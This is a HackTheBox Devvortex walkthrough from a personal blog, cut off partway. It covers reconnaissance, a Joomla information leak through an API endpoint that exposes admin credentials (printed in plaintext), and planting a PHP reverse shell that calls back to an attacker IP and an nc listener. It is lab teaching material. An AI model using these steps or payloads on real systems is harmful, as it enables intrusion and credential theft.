<!DOCTYPE html>
<html lang="en" dir="ltr">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Devvortex is an easy difficulty box, with an exposed private subdomain. The subdomain is utilizing a vulnerable version of Joomla, which we can use to view login credentials. As an admin of the site, we can edit php pages to a reverse or web shell. With access to the system, we can access all credentials in the mysql database, and crack a user's password. The user has sudo privileges on apport-cli, which uses less as a pager that we can abuse to escape into an interactive shell session as root.">
<title>HackTheBox - Devvortex</title>

<link rel='canonical' href='http://localhost:1313/p/hackthebox-devvortex/'>

<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="HackTheBox - Devvortex">
<meta property='og:description' content="Devvortex is an easy difficulty box, with an exposed private subdomain. The subdomain is utilizing a vulnerable version of Joomla, which we can use to view login credentials. As an admin of the site, we can edit php pages to a reverse or web shell. With access to the system, we can access all credentials in the mysql database, and crack a user's password. The user has sudo privileges on apport-cli, which uses less as a pager that we can abuse to escape into an interactive shell session as root.">
<meta property='og:url' content='http://localhost:1313/p/hackthebox-devvortex/'>
<meta property='og:site_name' content='Spencer&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Joomla' /><meta property='article:tag' content='Webshell' /><meta property='article:tag' content='MySQL' /><meta property='article:tag' content='hashcat' /><meta property='article:tag' content='less' /><meta property='article:published_time' content='2024-04-27T10:42:02-05:00'/><meta property='article:modified_time' content='2024-04-27T10:42:02-05:00'/><meta property='og:image' content='http://localhost:1313/p/hackthebox-devvortex/Devvortex.png' />
<meta name="twitter:title" content="HackTheBox - Devvortex">
<meta name="twitter:description" content="Devvortex is an easy difficulty box, with an exposed private subdomain. The subdomain is utilizing a vulnerable version of Joomla, which we can use to view login credentials. As an admin of the site, we can edit php pages to a reverse or web shell. With access to the system, we can access all credentials in the mysql database, and crack a user's password. The user has sudo privileges on apport-cli, which uses less as a pager that we can abuse to escape into an interactive shell session as root."><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='http://localhost:1313/p/hackthebox-devvortex/Devvortex.png' />
    <link rel="shortcut icon" href="/favicon.png" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu897059592634026878.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">üç•</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
            <h2 class="site-description">Lorem ipsum dolor sit amet, consectetur adipiscing elit.</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/CaiJimmy/hugo-theme-stack'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/post' >
                
                
                
                <span>Posts</span>
            </a>
        </li>
        
        
        <li >
            <a href='/awards' >
                
                
                
                <span>Trophy Room</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>Dark Mode</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#enumeration">Enumeration</a>
      <ol>
        <li><a href="#enumerating-dev-subdomain">Enumerating dev subdomain</a></li>
        <li><a href="#unauthorized-access-to-credentials-via-vulnerable-joomla-version">Unauthorized access to credentials via vulnerable Joomla version</a></li>
        <li><a href="#creating-a-php-reverse-shell-by-editing-templates">Creating a php reverse shell by editing templates</a></li>
      </ol>
    </li>
    <li><a href="#lateral-movement">Lateral Movement</a>
      <ol>
        <li><a href="#reusing-credentials-to-access-mysql">Reusing credentials to access mysql</a></li>
      </ol>
    </li>
    <li><a href="#privilege-escalation">Privilege Escalation</a>
      <ol>
        <li><a href="#using-file-viewer-less-to-retain-a-privileged-shell-session">Using file viewer &rsquo;less&rsquo; to retain a privileged shell session</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/hackthebox-devvortex/">
                <img src="/p/hackthebox-devvortex/Devvortex_hu602764544117436009.png"
                        srcset="/p/hackthebox-devvortex/Devvortex_hu602764544117436009.png 800w, /p/hackthebox-devvortex/Devvortex_hu11709663025737389181.png 1600w"
                        width="800" 
                        height="650" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Devvortex" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/hack-the-box/" >
                Hack the Box
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/hackthebox-devvortex/">HackTheBox - Devvortex</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            Devvortex is an easy difficulty box, with an exposed private subdomain. The subdomain is utilizing a vulnerable version of Joomla, which we can use to view login credentials. As an admin of the site, we can edit php pages to a reverse or web shell. With access to the system, we can access all credentials in the mysql database, and crack a user&#39;s password. The user has sudo privileges on apport-cli, which uses less as a pager that we can abuse to escape into an interactive shell session as root.
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Apr 27, 2024</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    12 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h2 id="enumeration">Enumeration
</h2><p>initial nmap:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Nmap scan report for 10.129.162.96
</span></span><span class="line"><span class="cl">Host is up (0.054s latency).
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
</span></span><span class="line"><span class="cl">| ssh-hostkey: 
</span></span><span class="line"><span class="cl">|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
</span></span><span class="line"><span class="cl">|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
</span></span><span class="line"><span class="cl">|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.18.0 (Ubuntu)
</span></span><span class="line"><span class="cl">|_http-title: Did not follow redirect to http://devvortex.htb/
</span></span><span class="line"><span class="cl">|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 8.47 seconds
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can note that there is a web server open on port 80, utilizing nginx.
There is a redirection to <code>devvortex.htb</code>, so we should add this to /etc/hosts:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Documents/Devvortex]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ cat /etc/hosts          
</span></span><span class="line"><span class="cl">127.0.0.1       localhost
</span></span><span class="line"><span class="cl">127.0.1.1       kali
</span></span><span class="line"><span class="cl">::1             localhost ip6-localhost ip6-loopback
</span></span><span class="line"><span class="cl">ff02::1         ip6-allnodes
</span></span><span class="line"><span class="cl">ff02::2         ip6-allrouters
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">10.129.162.96 devvortex.htb
</span></span></code></pre></td></tr></table>
</div>
</div><p>When we fuzz for subdomains, we can find the subdomain <code>dev.devvortex.htb</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">‚îå‚îÄ‚îÄ</span><span class="p">(</span><span class="n">kali</span><span class="err">„âø</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">Devvortex</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">‚îî‚îÄ</span><span class="o">$</span> <span class="n">gobuster</span> <span class="n">vhost</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">devvortex</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">raft</span><span class="o">-</span><span class="n">medium</span><span class="o">-</span><span class="n">words</span><span class="o">-</span><span class="n">lowercase</span><span class="o">.</span><span class="n">txt</span> <span class="o">--</span><span class="n">append</span><span class="o">-</span><span class="n">domain</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="n">Gobuster</span> <span class="n">v3</span><span class="o">.</span><span class="mi">6</span>
</span></span><span class="line"><span class="cl"><span class="n">by</span> <span class="n">OJ</span> <span class="n">Reeves</span> <span class="p">(</span><span class="err">@</span><span class="n">TheColonial</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">Christian</span> <span class="n">Mehlmauer</span> <span class="p">(</span><span class="err">@</span><span class="n">firefart</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Url</span><span class="p">:</span>             <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">devvortex</span><span class="o">.</span><span class="n">htb</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Method</span><span class="p">:</span>          <span class="n">GET</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Threads</span><span class="p">:</span>         <span class="mi">10</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Wordlist</span><span class="p">:</span>        <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">raft</span><span class="o">-</span><span class="n">medium</span><span class="o">-</span><span class="n">words</span><span class="o">-</span><span class="n">lowercase</span><span class="o">.</span><span class="n">txt</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">User</span> <span class="n">Agent</span><span class="p">:</span>      <span class="n">gobuster</span><span class="o">/</span><span class="mf">3.6</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Timeout</span><span class="p">:</span>         <span class="mi">10</span><span class="n">s</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Append</span> <span class="n">Domain</span><span class="p">:</span>   <span class="bp">true</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="n">Starting</span> <span class="n">gobuster</span> <span class="ow">in</span> <span class="n">VHOST</span> <span class="n">enumeration</span> <span class="n">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="n">Found</span><span class="p">:</span> <span class="n">dev</span><span class="o">.</span><span class="n">devvortex</span><span class="o">.</span><span class="n">htb</span> <span class="n">Status</span><span class="p">:</span> <span class="mi">502</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">166</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">Found</span><span class="p">:</span> <span class="o">..</span><span class="n">devvortex</span><span class="o">.</span><span class="n">htb</span> <span class="n">Status</span><span class="p">:</span> <span class="mi">400</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">166</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">Found</span><span class="p">:</span> <span class="o">.</span><span class="n">html</span><span class="o">..</span><span class="n">devvortex</span><span class="o">.</span><span class="n">htb</span> <span class="n">Status</span><span class="p">:</span> <span class="mi">400</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">166</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">Found</span><span class="p">:</span> <span class="o">.</span><span class="n">htm</span><span class="o">..</span><span class="n">devvortex</span><span class="o">.</span><span class="n">htb</span> <span class="n">Status</span><span class="p">:</span> <span class="mi">400</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">166</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">Found</span><span class="p">:</span> <span class="o">.</span><span class="n">php</span><span class="o">..</span><span class="n">devvortex</span><span class="o">.</span><span class="n">htb</span> <span class="n">Status</span><span class="p">:</span> <span class="mi">400</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">166</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">Found</span><span class="p">:</span> <span class="o">.</span><span class="n">search</span><span class="o">..</span><span class="n">devvortex</span><span class="o">.</span><span class="n">htb</span> <span class="n">Status</span><span class="p">:</span> <span class="mi">400</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">166</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">Found</span><span class="p">:</span> <span class="o">.</span><span class="n">aspx</span><span class="o">..</span><span class="n">devvortex</span><span class="o">.</span><span class="n">htb</span> <span class="n">Status</span><span class="p">:</span> <span class="mi">400</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">166</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">Found</span><span class="p">:</span> <span class="o">.</span><span class="n">pdf</span><span class="o">..</span><span class="n">devvortex</span><span class="o">.</span><span class="n">htb</span> <span class="n">Status</span><span class="p">:</span> <span class="mi">400</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">166</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">Progress</span><span class="p">:</span> <span class="mi">27983</span> <span class="o">/</span> <span class="mi">56294</span> <span class="p">(</span><span class="mf">49.71</span><span class="o">%</span><span class="p">)</span><span class="o">^</span><span class="n">C</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="n">Keyboard</span> <span class="n">interrupt</span> <span class="n">detected</span><span class="p">,</span> <span class="n">terminating</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">Progress</span><span class="p">:</span> <span class="mi">28083</span> <span class="o">/</span> <span class="mi">56294</span> <span class="p">(</span><span class="mf">49.89</span><span class="o">%</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="n">Finished</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Using the raft wordlist was a bit of a poor choice, as it was producting quite a few false positives with words beginning with a dot.</p>
<h3 id="enumerating-dev-subdomain">Enumerating dev subdomain
</h3><p>With basic enumeration, we can find interesting information in a <code>robots.txt</code> file. Robots.txt is used to tell automated web crawlers which subdomains are off-limits. This can help private data from being found in google searches, but it also gives us a good idea on what areas can contain sensitive information.
<img src="/p/hackthebox-devvortex/Images/robotstxt.png"
	width="553"
	height="495"
	srcset="/p/hackthebox-devvortex/Images/robotstxt_hu1881245777170735693.png 480w, /p/hackthebox-devvortex/Images/robotstxt_hu4137240225815595601.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="111"
		data-flex-basis="268px"
	
></p>
<p>We can also glean some very important information from the standard format of this robots.txt as well: the server is running Joomla, as indicated by the standard commented information. We can learn more about the joomla version by checking the README, also conveniently located in the root folder:</p>
<p><img src="/p/hackthebox-devvortex/Images/joomla.png"
	width="832"
	height="327"
	srcset="/p/hackthebox-devvortex/Images/joomla_hu3985067319072200265.png 480w, /p/hackthebox-devvortex/Images/joomla_hu6732383409345146521.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="254"
		data-flex-basis="610px"
	
></p>
<p>We can read here that the version appears to be 4.2.x, as the latest changelog mentions such. When we search for joomla vulnerabilities, we find <a class="link" href="https://www.exploit-db.com/exploits/51334"  target="_blank" rel="noopener"
    >an information disclosure CVE</a> that might be relevant.</p>
<h3 id="unauthorized-access-to-credentials-via-vulnerable-joomla-version">Unauthorized access to credentials via vulnerable Joomla version
</h3><p>The exploit script did not work for me, but we can see from the code that it fetches information from an exposed api endpoint:
<code>/api/index.php/v1/config/application?public=true</code>
We can visit this page manually, and find a username and password within:</p>
<p><img src="/p/hackthebox-devvortex/Images/api.png"
	width="978"
	height="710"
	srcset="/p/hackthebox-devvortex/Images/api_hu17056531720794000081.png 480w, /p/hackthebox-devvortex/Images/api_hu16963938277288856143.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="137"
		data-flex-basis="330px"
	
></p>
<p><code>lewis:P4ntherg0t1n5r3c0n##</code></p>
<p>With these credentials, we can login to the Joomla Administrator Login page by visiting <code>http://dev.devvortex.htb/administrator/</code>:</p>
<p><img src="/p/hackthebox-devvortex/Images/admin.png"
	width="1186"
	height="683"
	srcset="/p/hackthebox-devvortex/Images/admin_hu8715528440435972919.png 480w, /p/hackthebox-devvortex/Images/admin_hu9744261569238107199.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="173"
		data-flex-basis="416px"
	
></p>
<h3 id="creating-a-php-reverse-shell-by-editing-templates">Creating a php reverse shell by editing templates
</h3><p>The administrator is able to edit php templates via System &gt; Site Templates, and with this I can upload a php reverse shell. Getting php shell:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Documents/Devvortex]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ cp /usr/share/webshells/php/php-reverse-shell.php .
</span></span></code></pre></td></tr></table>
</div>
</div><p>We need to edit the IP address and port of our php file:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Documents/Devvortex]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ head php-reverse-shell.php                                           
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">set_time_limit (0);
</span></span><span class="line"><span class="cl">$VERSION = &#34;1.0&#34;;
</span></span><span class="line"><span class="cl">$ip = &#39;10.10.14.102&#39;;  // CHANGE THIS
</span></span><span class="line"><span class="cl">$port = 8000;       // CHANGE THIS
</span></span><span class="line"><span class="cl">$chunk_size = 1400;
</span></span><span class="line"><span class="cl">$write_a = null;
</span></span><span class="line"><span class="cl">$error_a = null;
</span></span><span class="line"><span class="cl">$shell = &#39;uname -a; w; id; /bin/sh -i&#39;;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Replacing error.php:</p>
<p><img src="/p/hackthebox-devvortex/Images/errorphp.png"
	width="1210"
	height="701"
	srcset="/p/hackthebox-devvortex/Images/errorphp_hu12693161238885656338.png 480w, /p/hackthebox-devvortex/Images/errorphp_hu7706181751173436215.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="172"
		data-flex-basis="414px"
	
></p>
<p>Set up nc listener:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Documents/Devvortex]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ nc -nvlp 8000
</span></span><span class="line"><span class="cl">listening on [any] 8000 ...
</span></span></code></pre></td></tr></table>
</div>
</div><p>And now, when we visit the error template page at <code>http://dev.devvortex.htb/templates/cassiopeia/error.php</code>, we will catch the reverse shell:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">‚îå‚îÄ‚îÄ</span><span class="p">(</span><span class="n">kali</span><span class="err">„âø</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">Devvortex</span><span class="p">]</span>
